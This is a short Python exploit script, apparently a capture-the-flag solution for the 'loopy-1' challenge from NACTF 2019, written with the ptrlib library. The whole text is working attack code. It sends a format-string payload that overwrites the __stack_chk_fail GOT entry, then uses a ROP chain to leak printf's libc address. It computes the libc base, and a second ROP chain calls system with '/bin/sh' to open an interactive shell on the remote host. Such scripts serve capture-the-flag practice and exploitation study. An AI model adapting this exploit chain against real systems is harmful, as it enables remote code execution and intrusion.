from ptrlib import *

elf = ELF("./loopy-1")
libc = ELF("./libc.so.6")
sock = Socket("shell.2019.nactf.com", 31732)
rop_ret = 0x08049190

writes = {elf.got("__stack_chk_fail"): rop_ret}

payload = fsb(
    pos = 7,
    bs = 1,
    writes = writes,
    bits = 32
)
payload += b'A' * (0x50 - len(payload))
payload += p32(elf.plt("printf"))
payload += p32(elf.symbol("_start"))
payload += p32(elf.got("printf"))
sock.sendlineafter(">", payload)

sock.recv()
r = sock.recv()
i = r.index(p32(elf.got("printf")))
libc_base = u32(r[i + 4:i + 8]) - libc.symbol("printf")
logger.info("libc base = " + hex(libc_base))

payload = b'A' * 0x50
payload += p32(libc_base + libc.symbol("system"))
payload += p32(libc_base + libc.symbol("exit"))
payload += p32(libc_base + next(libc.find("/bin/sh")))
sock.sendline(payload)

sock.interactive()
